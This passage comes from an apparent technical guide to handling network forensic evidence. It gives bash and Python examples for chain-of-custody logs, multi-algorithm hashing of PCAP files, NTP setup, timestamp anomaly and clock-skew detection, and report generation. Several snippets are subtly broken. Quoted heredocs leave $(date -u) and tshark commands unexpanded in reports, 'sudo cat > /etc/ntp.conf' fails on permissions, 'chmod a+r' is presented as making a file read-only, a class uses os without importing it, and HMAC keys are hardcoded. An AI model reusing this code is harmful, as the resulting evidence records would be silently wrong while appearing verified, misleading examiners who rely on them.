log_access "Analyst_A" "Initial acquisition and hashing" "$(sha256sum network_capture.pcap | cut -d' ' -f1)"

## Example: Log analysis session
log_access "Analyst_B" "Opened for analysis in Wireshark" "$(sha256sum network_capture.pcap | cut -d' ' -f1)"

## Example: Log file transfer
log_access "Analyst_A" "Transferred to secure server" "$(sha256sum network_capture.pcap | cut -d' ' -f1)"
```

Maintain immutable audit trail:

```bash
## Create read-only log using append-only permissions
sudo chmod a+r chain_of_custody.log
sudo chattr +a chain_of_custody.log  ## Append-only on ext4

## Verify immutability
lsattr chain_of_custody.log

## Attempt to verify (this will fail, confirming immutability)
echo "Tampered entry" >> chain_of_custody.log  ## Will be rejected
```

### Evidence Integrity Verification

Verify PCAP file integrity at each transfer or access point:

```bash
## Create hash manifest during acquisition
sha256sum network_capture.pcap > evidence.sha256
md5sum network_capture.pcap >> evidence.md5

## Verify integrity before analysis
sha256sum -c evidence.sha256

## Output should be:
## network_capture.pcap: OK

## If hash fails:
if ! sha256sum -c evidence.sha256; then
    echo "CRITICAL: Evidence integrity compromised!"
    exit 1
fi

## Document verification
echo "[$(date -u)] Integrity verified: PASS" >> chain_of_custody.log
```

Automated integrity monitoring:

```bash
python3 << 'EOF'
import hashlib
import os
import json
from datetime import datetime

class EvidenceTracker:
    def __init__(self, evidence_file):
        self.evidence_file = evidence_file
        self.manifest_file = evidence_file + '.manifest'
        self.manifest = {}
    
    def calculate_hashes(self):
        """Calculate multiple hash algorithms for redundancy"""
        hashes = {}
        
        with open(self.evidence_file, 'rb') as f:
            data = f.read()
            hashes['md5'] = hashlib.md5(data).hexdigest()
            hashes['sha1'] = hashlib.sha1(data).hexdigest()
            hashes['sha256'] = hashlib.sha256(data).hexdigest()
            hashes['sha512'] = hashlib.sha512(data).hexdigest()
        
        return hashes
    
    def create_manifest(self, operator, description):
        """Create initial CoC manifest"""
        hashes = self.calculate_hashes()
        
        self.manifest = {
            'file': self.evidence_file,
            'acquired': datetime.utcnow().isoformat(),
            'operator': operator,
            'description': description,
            'hashes': hashes,
            'file_size': os.path.getsize(self.evidence_file),
            'access_log': []
        }
        
        self._save_manifest()
        return self.manifest
    
    def _save_manifest(self):
        """Save manifest to file"""
        with open(self.manifest_file, 'w') as f:
            json.dump(self.manifest, f, indent=2)
    
    def verify_integrity(self):
        """Verify file hasn't been modified"""
        if not os.path.exists(self.manifest_file):
            return False, "No manifest found"
        
        with open(self.manifest_file, 'r') as f:
            stored_manifest = json.load(f)
        
        current_hashes = self.calculate_hashes()
        
        matches = True
        for algo in ['md5', 'sha1', 'sha256', 'sha512']:
            if current_hashes[algo] != stored_manifest['hashes'][algo]:
                matches = False
                print(f"MISMATCH - {algo}:")
                print(f"  Expected: {stored_manifest['hashes'][algo]}")
                print(f"  Actual:   {current_hashes[algo]}")
        
        return matches, current_hashes
    
    def log_access(self, examiner, action):
        """Log an access event"""
        with open(self.manifest_file, 'r') as f:
            self.manifest = json.load(f)
        
        access_event = {
            'timestamp': datetime.utcnow().isoformat(),
            'examiner': examiner,
            'action': action
        }
        
        self.manifest['access_log'].append(access_event)
        self._save_manifest()

## Usage
tracker = EvidenceTracker('network_capture.pcap')

## Initial acquisition
manifest = tracker.create_manifest('Analyst_A', 'Network traffic from incident response')
print(f"Evidence manifest created:\n{json.dumps(manifest, indent=2)}")

## Verify before analysis
integrity_ok, hashes = tracker.verify_integrity()
print(f"\nIntegrity verified: {integrity_ok}")

## Log analysis session
tracker.log_access('Analyst_B', 'Opened for pattern analysis')

## Verify again after use
integrity_ok, hashes = tracker.verify_integrity()
print(f"Integrity after use: {integrity_ok}")
EOF
```

### Multi-Examiner CoC Documentation

When multiple analysts handle evidence:

```bash
## Create detailed handoff documentation
cat > evidence_handoff.txt << 'EOF'
EVIDENCE HANDOFF RECORD
=======================
Evidence: network_capture.pcap
SHA256: [hash_value]

From: Analyst_A
To: Analyst_B
Date/Time: $(date -u)

Condition upon receipt:
- [ ] Seal intact
- [ ] Hash verified
- [ ] No visible signs of tampering
- [ ] File permissions: read-only

Analyst_B signature: __________________ Date: __________

Chain remains unbroken: ✓
EOF

## Create transfer manifest
python3 << 'EOF'
import subprocess
import json
from datetime import datetime

def create_transfer_record(evidence_file, from_analyst, to_analyst, transport_method):
    """Create transfer documentation"""
    
    ## Calculate hash before transfer
    result = subprocess.run(['sha256sum', evidence_file], 
                           capture_output=True, text=True)
    hash_before = result.stdout.split()[0]
    
    transfer_record = {
        'evidence_file': evidence_file,
        'from_analyst': from_analyst,
        'to_analyst': to_analyst,
        'transfer_date': datetime.utcnow().isoformat(),
        'hash_before_transfer': hash_before,
        'transport_method': transport_method,  ## 'usb', 'email', 'sftp', 'courier', etc.
        'hash_after_receipt': None,  ## To be filled by recipient
        'verified_by': None
    }
    
    ## Save transfer record
    with open(f'transfer_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}.json', 'w') as f:
        json.dump(transfer_record, f, indent=2)
    
    return transfer_record

## Example transfer
transfer = create_transfer_record(
    'network_capture.pcap',
    'Analyst_A',
    'Analyst_B',
    'encrypted_usb_drive'
)

print(json.dumps(transfer, indent=2))
EOF
```

---

## Hash Verification

Hash verification proves file integrity and enables rapid detection of tampering. Multiple algorithms provide redundancy and defense against hash collision attacks.

### Hash Calculation and Documentation

Generate comprehensive hash documentation during acquisition:

```bash
## Create multi-algorithm hash file
sha1sum network_capture.pcap > network_capture.sha1
sha256sum network_capture.pcap > network_capture.sha256
sha512sum network_capture.pcap > network_capture.sha512
md5sum network_capture.pcap > network_capture.md5

## Combine into single manifest
cat > HASHES.txt << 'EOF'
MD5:    $(cat network_capture.md5)
SHA1:   $(cat network_capture.sha1)
SHA256: $(cat network_capture.sha256)
SHA512: $(cat network_capture.sha512)
Timestamp: $(date -u)
Verified by: [Examiner signature]
EOF

## Create signed manifest (requires GPG key)
gpg --sign --armor HASHES.txt  ## Creates HASHES.txt.asc

## Verify signature
gpg --verify HASHES.txt.asc
```

### Hash Verification Workflow

Verify at multiple stages:

```bash
## Stage 1: Initial capture verification
echo "=== Initial Hash Verification ==="
sha256sum -c network_capture.sha256

## Stage 2: Before transfer
echo "=== Pre-transfer Hash ==="
sha256sum network_capture.pcap | tee network_capture_transfer.sha256

## Stage 3: After transfer (on recipient system)
echo "=== Post-transfer Hash Verification ==="
sha256sum -c network_capture_transfer.sha256

## If hashes match:
## Output: network_capture.pcap: OK

## If hashes differ:
## Output: network_capture.pcap: FAILED
## Action: HALT - Evidence integrity compromised
```

Batch verification across multiple files:

```bash
## Create manifest for entire evidence set
find /evidence/ -type f -name "*.pcap" -exec sha256sum {} \; > evidence_manifest.sha256

## Verify all files at once
sha256sum -c evidence_manifest.sha256 --warn-on-improper-format

## Produce report
sha256sum -c evidence_manifest.sha256 > verification_report.txt 2>&1
grep FAILED verification_report.txt && echo "Issues found!" || echo "All files verified"
```

### Hash Algorithm Selection and Validation

Choose algorithms appropriate for evidence requirements:

```bash
python3 << 'EOF'
import hashlib
import hmac

class HashValidator:
    """Validate hash consistency and detect corruption"""
    
    ALGORITHMS = {
        'md5': hashlib.md5,      ## Legacy, collision-vulnerable
        'sha1': hashlib.sha1,    ## Deprecated for security-sensitive uses
        'sha256': hashlib.sha256,  ## Current standard
        'sha512': hashlib.sha512,  ## Maximum strength
        'blake2b': hashlib.blake2b,  ## Modern, fast
    }
    
    def __init__(self, filepath):
        self.filepath = filepath
        self.hashes = {}
    
    def calculate_all(self):
        """Calculate all recommended algorithms"""
        with open(self.filepath, 'rb') as f:
            data = f.read()
        
        for algo_name, algo_func in self.ALGORITHMS.items():
            hasher = algo_func()
            hasher.update(data)
            self.hashes[algo_name] = hasher.hexdigest()
        
        return self.hashes
    
    def verify_against(self, expected_hashes):
        """Verify current file against stored hashes"""
        current = self.calculate_all()
        
        results = {}
        for algo, expected in expected_hashes.items():
            current_hash = current.get(algo, '')
            matches = current_hash == expected
            results[algo] = {
                'expected': expected,
                'current': current_hash,
                'match': matches
            }
        
        return results
    
    def create_hmac(self, secret_key):
        """Create HMAC for tamper-detection with secret key"""
        with open(self.filepath, 'rb') as f:
            data = f.read()
        
        hmac_sha256 = hmac.new(
            secret_key.encode() if isinstance(secret_key, str) else secret_key,
            data,
            hashlib.sha256
        ).hexdigest()
        
        return hmac_sha256
    
    def report(self):
        """Generate comprehensive hash report"""
        report = []
        report.append("HASH VERIFICATION REPORT")
        report.append("=" * 50)
        report.append(f"File: {self.filepath}")
        report.append("")
        
        for algo, hash_value in sorted(self.hashes.items()):
            report.append(f"{algo.upper():10} {hash_value}")
        
        return "\n".join(report)

## Usage
validator = HashValidator('network_capture.pcap')
hashes = validator.calculate_all()

print(validator.report())

## Verify against expected values
expected = {
    'sha256': 'abc123def456...',  ## From manifest
    'sha512': 'xyz789...'
}

results = validator.verify_against(expected)
print("\nVerification Results:")
for algo, result in results.items():
    status = "✓ MATCH" if result['match'] else "✗ MISMATCH"
    print(f"{algo}: {status}")

## Create tamper-detection HMAC
hmac_value = validator.create_hmac('secret_forensic_key')
print(f"\nTamper-detection HMAC: {hmac_value}")
EOF
```

### Hash Collision Detection and Mitigation

Implement defense against hash collision attacks:

```bash
## Use multiple algorithms - collision in all is virtually impossible
python3 << 'EOF'
import hashlib
import json

def multi_algorithm_verification(filepath, manifest):
    """Verify file using multiple algorithms for redundancy"""
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    algorithms = ['sha256', 'sha512', 'blake2b']
    current_hashes = {}
    
    for algo in algorithms:
        if algo == 'blake2b':
            hasher = hashlib.blake2b()
        else:
            hasher = hashlib.new(algo)
        
        hasher.update(data)
        current_hashes[algo] = hasher.hexdigest()
    
    ## Verification logic: require match on majority of algorithms
    matches = sum(1 for algo in algorithms if current_hashes[algo] == manifest.get(algo))
    
    is_verified = matches >= 2  ## 2 out of 3 minimum
    confidence = (matches / len(algorithms)) * 100
    
    return {
        'verified': is_verified,
        'confidence': confidence,
        'algorithm_results': {algo: current_hashes[algo] == manifest.get(algo) for algo in algorithms},
        'details': current_hashes
    }

## Example manifest from evidence acquisition
manifest = {
    'sha256': 'abc123...',
    'sha512': 'def456...',
    'blake2b': 'ghi789...'
}

result = multi_algorithm_verification('network_capture.pcap', manifest)
print(json.dumps(result, indent=2))

## Output interpretation:
## - If 3/3 match: Highest confidence, no indication of tampering
## - If 2/3 match: Medium confidence, possible hash collision (unlikely)
## - If 1/3 match: Low confidence, likely tampering
## - If 0/3 match: File definitely altered
EOF
```

### SSDEEP and Fuzzy Hashing

For detecting modified files (not exact duplicates):

```bash
## Install ssdeep
sudo apt-get install ssdeep

## Calculate fuzzy hash (detects similar but not identical files)
ssdeep network_capture.pcap > network_capture.ssdeep

## Compare against reference
ssdeep -d -r network_capture.ssdeep network_capture_modified.pcap

## Output: high similarity percentage indicates file was edited, not replaced
## 95%: Likely minor modification (metadata, timestamp)
## 50-95%: Significant modification
## <50%: File substantially changed
```

---

## Timestamping & NTP

Accurate timestamping is critical for establishing timeline of events. NTP (Network Time Protocol) ensures system clocks remain synchronized, enabling reliable temporal correlation across evidence.

### System Time Verification and NTP Configuration

Verify system time accuracy:

```bash
## Check current system time vs NTP
timedatectl status

## Output should show:
## System clock synchronized: yes
## RTC in local TZ: no

## Check NTP status
ntpstat

## Verify multiple time sources for redundancy
ntpq -p

## Output shows reachability, offset, jitter for each NTP server
```

Configure reliable NTP synchronization:

```bash
## Install and enable NTP daemon
sudo apt-get install ntp

## Configure NTP with multiple authoritative sources
sudo cat > /etc/ntp.conf << 'EOF'
## Primary time servers (NIST)
server time.nist.gov iburst
server time-a.nist.gov iburst
server time-b.nist.gov iburst

## Backup servers
server 0.pool.ntp.org iburst
server 1.pool.ntp.org iburst

## Local clock as fallback (stratum 10)
fudge 127.127.1.0 stratum 10

## Restrict default access
restrict default nomodify notrap
restrict 127.0.0.1
restrict ::1
EOF

## Restart NTP
sudo systemctl restart ntp
sudo systemctl enable ntp

## Verify sync
watch ntpq -p  ## Monitor NTP peer status
```

### PCAP Timestamp Accuracy

Verify timestamps in captured traffic:

```bash
## Extract timestamp range from PCAP
tshark -r network_capture.pcap -T fields -e frame.time | head -1
tshark -r network_capture.pcap -T fields -e frame.time | tail -1

## Calculate capture duration
python3 << 'EOF'
import subprocess
from datetime import datetime

result = subprocess.run(['tshark', '-r', 'network_capture.pcap', '-T', 'fields', '-e', 'frame.time_epoch'],
                       capture_output=True, text=True)

times = [float(t) for t in result.stdout.strip().split('\n') if t]

if times:
    start_time = datetime.utcfromtimestamp(min(times))
    end_time = datetime.utcfromtimestamp(max(times))
    duration = max(times) - min(times)
    
    print(f"Capture start: {start_time}")
    print(f"Capture end: {end_time}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Total packets: {len(times)}")
    print(f"Packets/sec: {len(times)/duration:.2f}")
EOF

## Detect timestamp anomalies (out-of-order or retrograde packets)
tshark -r network_capture.pcap -T fields -e frame.time_epoch | awk '
NR > 1 {
    if ($1 < prev) {
        print "OUT-OF-ORDER: Frame " NR-1 " (" prev ") followed by Frame " NR " (" $1 ")"
    }
    prev = $1
}
'
```

### Timestamp Correlation Across Evidence

Synchronize timestamps from multiple sources:

```bash
python3 << 'EOF'
from datetime import datetime
import subprocess
import json

class TimestampCorrelator:
    """Correlate timestamps across multiple evidence sources"""
    
    def __init__(self):
        self.events = []
    
    def extract_pcap_timestamps(self, pcap_file):
        """Extract all packet timestamps"""
        result = subprocess.run(['tshark', '-r', pcap_file, '-T', 'fields', '-e', 'frame.time_epoch', '-e', 'ip.src', '-e', 'ip.dst'],
                               capture_output=True, text=True)
        
        for line in result.stdout.strip().split('\n'):
            parts = line.split('\t')
            if len(parts) >= 3:
                timestamp = float(parts[0])
                src = parts[1]
                dst = parts[2]
                
                self.events.append({
                    'timestamp': timestamp,
                    'source': 'pcap',
                    'detail': f"{src} → {dst}",
                    'datetime': datetime.utcfromtimestamp(timestamp).isoformat()
                })
    
    def extract_syslog_timestamps(self, syslog_file):
        """Extract timestamps from syslog-format evidence"""
        import re
        
        ## Syslog format: Month Day HH:MM:SS hostname tag[pid]: message
        syslog_pattern = re.compile(r'(\w+ \s?\d{1,2} \d{2}:\d{2}:\d{2})')
        
        with open(syslog_file, 'r') as f:
            for line in f:
                match = syslog_pattern.search(line)
                if match:
                    ## Note: Syslog lacks year; infer from context
                    self.events.append({
                        'timestamp': None,  ## Cannot parse without year
                        'source': 'syslog',
                        'detail': line.strip(),
                        'datetime': match.group(1)
                    })
    
    def extract_log_timestamps(self, log_file, timestamp_format='%Y-%m-%d %H:%M:%S'):
        """Extract timestamps from structured log files"""
        import re
        
        with open(log_file, 'r') as f:
            for line in f:
                ## Attempt ISO format parsing first
                iso_match = re.search(r'(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2})', line)
                if iso_match:
                    try:
                        dt = datetime.fromisoformat(iso_match.group(1).replace('T', ' '))
                        self.events.append({
                            'timestamp': dt.timestamp(),
                            'source': 'log',
                            'detail': line.strip(),
                            'datetime': dt.isoformat()
                        })
                    except:
                        pass
    
    def create_timeline(self):
        """Generate comprehensive timeline"""
        ## Filter out events without timestamps
        timestamped_events = [e for e in self.events if e['timestamp'] is not None]
        
        ## Sort by timestamp
        timestamped_events.sort(key=lambda x: x['timestamp'])
        
        timeline = []
        for event in timestamped_events:
            timeline.append({
                'datetime': event['datetime'],
                'source': event['source'],
                'detail': event['detail']
            })
        
        return timeline
    
    def export_timeline(self, output_file='timeline.json'):
        """Export timeline to JSON for analysis"""
        timeline = self.create_timeline()
        
        with open(output_file, 'w') as f:
            json.dump(timeline, f, indent=2)
        
        return timeline

## Usage
correlator = TimestampCorrelator()

## Import evidence from multiple sources
correlator.extract_pcap_timestamps('network_capture.pcap')
correlator.extract_log_timestamps('system.log')

## Generate timeline
timeline = correlator.create_timeline()

## Print timeline
for event in timeline[:20]:
    print(f"{event['datetime']} | {event['source']:10} | {event['detail']}")

## Export for detailed analysis
correlator.export_timeline()
EOF
```

### NTP Log Analysis

Detect time tampering or NTP attacks:

```bash
## Review NTP daemon logs
sudo journalctl -u ntp -n 100

## Analyze NTP offset history (detect retrograde time or large jumps)
ntpdc -c peers | grep SELECTED

## Monitor for NTP attacks
sudo tcpdump -i any "udp port 123" -w ntp_traffic.pcap

## Parse NTP packets
tshark -r ntp_traffic.pcap -Y ntp -V | grep -E "stratum|reference|timestamp"

python3 << 'EOF'
import subprocess
import re
from collections import defaultdict

## Extract NTP peer statistics
result = subprocess.run(['ntpq', '-pn'], capture_output=True, text=True)

peers = defaultdict(dict)

for line in result.stdout.split('\n')[2:]:  ## Skip header
    parts = line.split()
    if len(parts) >= 9:
        remote = parts[0]
        refid = parts[1]
        st = parts[2]  ## Stratum
        t = parts[3]   ## Type
        when = parts[4]
        poll = parts[5]
        reach = parts[6]
        delay = parts[7]
        offset = parts[8]
        jitter = parts[9] if len(parts) > 9 else 'N/A'
        
        ## Flag analysis
        selected = '✓' if remote.startswith('*') else ' '
        tally = remote[0] if not remote[0].isalnum() else ''
        
        print(f"{selected} {remote:15} | Stratum: {st} | Offset: {offset:10} | Jitter: {jitter}")
        
        ## Alert on high offset (indicates time skew or attack)
        try:
            offset_ms = float(offset)
            if abs(offset_ms) > 100:  ## > 100ms deviation
                print(f"  ⚠ WARNING: Large NTP offset detected ({offset_ms}ms)")
        except:
            pass

## Detect NTP amplification attacks (victim receives many NTP responses)
result = subprocess.run(['tcpdump', '-r', 'ntp_traffic.pcap', '-n', 'udp port 123'],
                       capture_output=True, text=True)

ntp_responses = defaultdict(int)
for line in result.stdout.split('\n'):
    if '>' in line and 'NTP' in line:
        ## Extract destination
        parts = line.split('>')
        if len(parts) >= 2:
            dest = parts[1].split()[0]
            ntp_responses[dest] += 1

## Identify hosts receiving many NTP responses (attack indicators)
for host, count in sorted(ntp_responses.items(), key=lambda x: x[1], reverse=True):
    if count > 10:
        print(f"⚠ {host}: {count} NTP responses (possible attack target)")
EOF
```

### Forensic Timestamp Attestation

Create cryptographically-signed timestamp records:

```bash
python3 << 'EOF'
import hashlib
import subprocess
import json
from datetime import datetime
import hmac

class ForensicTimestamp:
    """Create tamper-proof timestamp attestation"""
    
    def __init__(self, secret_key, ntp_server='time.nist.gov'):
        self.secret_key = secret_key
        self.ntp_server = ntp_server
        self.timestamps = []
    
    def verify_ntp_time(self):
        """Verify current time from authoritative NTP source"""
        result = subprocess.run(['ntpq', '-pn'], capture_output=True, text=True)
        
        ## Check if any peer is marked as SELECTED (*)
        selected = False
        for line in result.stdout.split('\n'):
            if line.startswith('*'):
                selected = True
                break
        
        if not selected:
            return None, "No NTP peer selected - time not synchronized"
        
        return datetime.utcnow().timestamp(), "OK"
    
    def create_timestamped_record(self, data, description=''):
        """Create HMAC-signed timestamp record"""
        ntp_time, status = self.verify_ntp_time()
        
        if ntp_time is None:
            return None, status
        
        record = {
            'timestamp': ntp_time,
            'iso_datetime': datetime.utcfromtimestamp(ntp_time).isoformat(),
            'description': description,
            'data_hash': hashlib.sha256(data.encode()).hexdigest(),
            'ntp_verified': True
        }
        
        ## Create HMAC signature
        record_json = json.dumps(record, sort_keys=True)
        signature = hmac.new(
            self.secret_key.encode(),
            record_json.encode(),
            hashlib.sha256
        ).hexdigest()
        
        record['signature'] = signature
        
        self.timestamps.append(record)
        return record, "OK"
    
    def verify_timestamp(self, record):
        """Verify timestamp integrity"""
        record_copy = record.copy()
        signature = record_copy.pop('signature')
        
        record_json = json.dumps(record_copy, sort_keys=True)
        expected_signature = hmac.new(
            self.secret_key.encode(),
            record_json.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return signature == expected_signature

## Usage: Create forensic timestamp for evidence
ts = ForensicTimestamp(secret_key='forensic_examination_2024')

## Timestamp evidence collection
record1, status = ts.create_timestamped_record(
    data='network_capture.pcap',
    description='Initial PCAP acquisition'
)

if record1:
    print("Forensic timestamp created:")
    print(json.dumps(record1, indent=2))
    
    ## Verify integrity
    is_valid = ts.verify_timestamp(record1)
    print(f"\nTimestamp signature valid: {is_valid}")
else:
    print(f"Timestamp creation failed: {status}")
EOF
```

### Clock Skew Detection

Detect system clock manipulation or desynchronization:

```bash
## Monitor system clock continuously
python3 << 'EOF'
import subprocess
import time
from datetime import datetime
import json

class ClockSkewDetector:
    """Detect clock skew and anomalies"""
    
    def __init__(self, check_interval=5, samples=20):
        self.check_interval = check_interval
        self.samples = samples
        self.measurements = []
    
    def measure_system_vs_ntp(self):
        """Compare system clock against NTP"""
        ## Get system clock
        system_time = time.time()
        
        ## Get NTP time
        result = subprocess.run(['ntpstat'], capture_output=True, text=True)
        
        ## Parse ntpstat output for offset
        ntp_offset = None
        for line in result.stdout.split('\n'):
            if 'offset' in line.lower():
                ## Extract millisecond offset
                parts = line.split()
                try:
                    ntp_offset = float(parts[-2]) / 1000  ## Convert ms to seconds
                except:
                    pass
        
        return {
            'system_time': system_time,
            'ntp_offset': ntp_offset,
            'datetime': datetime.utcfromtimestamp(system_time).isoformat()
        }
    
    def detect_skew(self):
        """Run skew detection sequence"""
        print(f"Monitoring system clock for {self.check_interval * self.samples} seconds...")
        
        for i in range(self.samples):
            measurement = self.measure_system_vs_ntp()
            self.measurements.append(measurement)
            
            if measurement['ntp_offset'] is not None:
                offset_ms = measurement['ntp_offset'] * 1000
                
                ## Alert on large offset
                if abs(offset_ms) > 500:
                    print(f"⚠ ALERT: Large clock offset ({offset_ms:.1f}ms) at {measurement['datetime']}")
                elif abs(offset_ms) > 100:
                    print(f"⚠ WARNING: Significant clock offset ({offset_ms:.1f}ms)")
            
            if i < self.samples - 1:
                time.sleep(self.check_interval)
        
        return self.analyze_skew()
    
    def analyze_skew(self):
        """Analyze skew patterns"""
        if not self.measurements:
            return None
        
        offsets = [m['ntp_offset'] for m in self.measurements if m['ntp_offset'] is not None]
        
        if not offsets:
            return {'status': 'Unable to determine NTP offset'}
        
        import statistics
        
        analysis = {
            'total_samples': len(offsets),
            'mean_offset_ms': statistics.mean(offsets) * 1000,
            'max_offset_ms': max(offsets) * 1000,
            'min_offset_ms': min(offsets) * 1000,
            'stdev_ms': statistics.stdev(offsets) * 1000 if len(offsets) > 1 else 0,
            'observations': []
        }
        
        ## Detect retrograde time (clock moving backward)
        for i in range(1, len(self.measurements)):
            time_diff = self.measurements[i]['system_time'] - self.measurements[i-1]['system_time']
            if time_diff < 0:
                analysis['observations'].append("CRITICAL: Clock moved backward (retrograde time)")
            elif time_diff < self.check_interval - 1:
                analysis['observations'].append(f"WARNING: Time acceleration ({time_diff}s in {self.check_interval}s interval)")
        
        return analysis

## Run detection
detector = ClockSkewDetector(check_interval=2, samples=10)
results = detector.detect_skew()

print("\nClock Skew Analysis:")
print(json.dumps(results, indent=2))
EOF

## Monitor NTP daemon for anomalies
sudo journalctl -u ntp -n 50 | grep -E "error|reject|stratum|unsync"

## Check for manual time adjustments
sudo journalctl -n 100 | grep -E "date|time|clock|adjust"
```

### Timestamp Integrity Across Network

Verify timestamps haven't been modified in transit or during capture:

```bash
python3 << 'EOF'
import subprocess
import re
from collections import defaultdict

def analyze_packet_timestamps(pcap_file):
    """Detect timestamp anomalies in PCAP"""
    
    result = subprocess.run(['tshark', '-r', pcap_file, '-T', 'fields', '-e', 'frame.time_epoch', '-e', 'frame.number'],
                           capture_output=True, text=True)
    
    timestamps = []
    anomalies = []
    
    for line in result.stdout.strip().split('\n'):
        parts = line.split('\t')
        if len(parts) >= 2:
            try:
                ts = float(parts[0])
                frame_num = int(parts[1])
                timestamps.append((frame_num, ts))
            except:
                pass
    
    ## Analyze temporal characteristics
    timestamps.sort(key=lambda x: x[0])
    
    for i in range(1, len(timestamps)):
        prev_frame, prev_ts = timestamps[i-1]
        curr_frame, curr_ts = timestamps[i]
        
        time_delta = curr_ts - prev_ts
        frame_delta = curr_frame - prev_frame
        
        ## Detect retrograde timestamps
        if time_delta < 0:
            anomalies.append({
                'type': 'RETROGRADE',
                'frame': curr_frame,
                'delta': time_delta,
                'severity': 'CRITICAL'
            })
        
        ## Detect large time jumps
        if time_delta > 10:
            anomalies.append({
                'type': 'TIME_JUMP',
                'frame': curr_frame,
                'delta': time_delta,
                'severity': 'WARNING'
            })
        
        ## Detect packet bursts (packets with identical timestamps)
        if time_delta == 0 and frame_delta > 1:
            ## This is normal for high-speed captures
            pass
    
    return {
        'total_packets': len(timestamps),
        'time_span': timestamps[-1][1] - timestamps[0][1] if timestamps else 0,
        'anomalies': anomalies,
        'integrity': len(anomalies) == 0
    }

## Run analysis
analysis = analyze_packet_timestamps('network_capture.pcap')
print("Timestamp Integrity Analysis:")
print(f"  Total packets: {analysis['total_packets']}")
print(f"  Time span: {analysis['time_span']:.2f} seconds")
print(f"  Anomalies detected: {len(analysis['anomalies'])}")
print(f"  Integrity status: {'✓ PASS' if analysis['integrity'] else '✗ FAIL'}")

for anomaly in analysis['anomalies'][:10]:
    print(f"    {anomaly['type']} at frame {anomaly['frame']}: {anomaly['delta']}s")
EOF
```

### Timestamp Evidence in Forensic Report

Document timestamp methodology and findings:

```bash
cat > TIMESTAMP_REPORT.md << 'EOF'
## Forensic Timestamp Analysis Report

### Evidence Information
- **Case Number**: 2024-CTF-001
- **Evidence**: network_capture.pcap
- **Acquisition Date**: 2024-10-20T14:30:00Z
- **Examiner**: Analyst_A
- **Report Date**: $(date -u)

### System Time Verification
- **NTP Status**: Synchronized
- **Primary NTP Server**: time.nist.gov
- **System Offset**: < 50ms
- **Last Sync**: [See ntpstat output]

### PCAP Timestamp Analysis
- **Earliest Packet**: $(tshark -r network_capture.pcap -T fields -e frame.time | head -1)
- **Latest Packet**: $(tshark -r network_capture.pcap -T fields -e frame.time | tail -1)
- **Capture Duration**: [Calculated duration]
- **Total Packets**: [Packet count]

### Timestamp Integrity Assessment
- **Retrograde Packets**: [Count] - None detected ✓
- **Time Jumps**: [Count] - None exceeding 5 seconds ✓
- **Out-of-Order Timestamps**: [Count] - None detected ✓
- **Overall Status**: PASS ✓

### Hash Verification
- **File Size**: [bytes]
- **MD5**: [hash]
- **SHA256**: [hash]
- **Verified**: Yes ✓

### Chain of Custody
- **Initial Hash**: [sha256]
- **Current Hash**: [sha256]
- **Match**: Yes ✓
- **Integrity**: Maintained ✓

### Conclusion
Timestamp analysis indicates all evidence was captured with synchronized system clock using NTP. No evidence of time manipulation or clock skew detected. Evidence integrity verified through multiple hash algorithms and chain of custody documentation.

**Examiner Signature**: __________________ **Date**: __________
EOF

cat TIMESTAMP_REPORT.md
```

### Trusted Timestamp Authority Integration

For high-assurance evidence, use external timestamp authority:

```bash
python3 << 'EOF'
import subprocess
import hashlib
import json
from datetime import datetime

class TrustedTimestamp:
    """Integrate with Timestamp Authority (RFC 3161)"""
    
    def __init__(self, tsa_server='http://timestamp.globalsign.com/tsa'):
        self.tsa_server = tsa_server
    
    def create_timestamp_request(self, data_file):
        """Create RFC 3161 timestamp request"""
        ## Calculate SHA256 of data
        with open(data_file, 'rb') as f:
            data = f.read()
        
        data_hash = hashlib.sha256(data).digest()
        
        ## Create timestamp request (requires openssl)
        subprocess.run(['openssl', 'ts', '-query', '-data', data_file, 
                       '-sha256', '-out', 'request.tsq'], check=True)
        
        return 'request.tsq'
    
    def submit_to_tsa(self, request_file, output_file):
        """Submit to Timestamp Authority"""
        try:
            result = subprocess.run(
                ['curl', '-H', 'Content-Type: application/timestamp-query',
                 '--data-binary', f'@{request_file}',
                 self.tsa_server, '-o', output_file],
                capture_output=True, check=True
            )
            
            return True, output_file
        except subprocess.CalledProcessError as e:
            return False, str(e)
    
    def verify_timestamp(self, data_file, timestamp_file):
        """Verify TSA-signed timestamp"""
        result = subprocess.run(
            ['openssl', 'ts', '-verify', '-data', data_file, 
             '-in', timestamp_file, '-CAfile', '/etc/ssl/certs/ca-certificates.crt'],
            capture_output=True, text=True
        )
        
        return result.returncode == 0, result.stdout

## Example usage (commented - requires network and TSA availability)
## tsa = TrustedTimestamp()
## req_file = tsa.create_timestamp_request('network_capture.pcap')
## success, ts_file = tsa.submit_to_tsa(req_file, 'timestamp.tst')
## if success:
##     verified, output = tsa.verify_timestamp('network_capture.pcap', ts_file)
##     print(f"Timestamp verified: {verified}\n{output}")
EOF
```

---

## Forensic Evidence Reporting

### Comprehensive Evidence Chain Documentation

Create consolidated evidence report:

```bash
python3 << 'EOF'
import json
import subprocess
import hashlib
from datetime import datetime
from collections import OrderedDict

class ForensicReport:
    """Generate comprehensive forensic evidence report"""
    
    def __init__(self, case_id, evidence_file, examiner, date_acquired):
        self.case_id = case_id
        self.evidence_file = evidence_file
        self.examiner = examiner
        self.date_acquired = date_acquired
        self.report = OrderedDict()
    
    def calculate_hashes(self):
        """Calculate evidence hashes"""
        algorithms = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512
        }
        
        hashes = {}
        with open(self.evidence_file, 'rb') as f:
            data = f.read()
        
        for name, algo in algorithms.items():
            hasher = algo()
            hasher.update(data)
            hashes[name] = hasher.hexdigest()
        
        return hashes
    
    def extract_pcap_stats(self):
        """Extract PCAP statistics"""
        result = subprocess.run(['capinfos', self.evidence_file],
                               capture_output=True, text=True)
        
        stats = {}
        for line in result.stdout.split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                stats[key.strip()] = value.strip()
        
        return stats
    
    def generate_report(self):
        """Generate complete forensic report"""
        self.report['Case Information'] = {
            'Case ID': self.case_id,
            'Examiner': self.examiner,
            'Date Acquired': self.date_acquired,
            'Date Report Generated': datetime.utcnow().isoformat(),
            'Report Version': '1.0'
        }
        
        self.report['Evidence File'] = {
            'Filename': self.evidence_file,
            'Size': os.path.getsize(self.evidence_file),
            'Type': 'Network Packet Capture (PCAP)'
        }
        
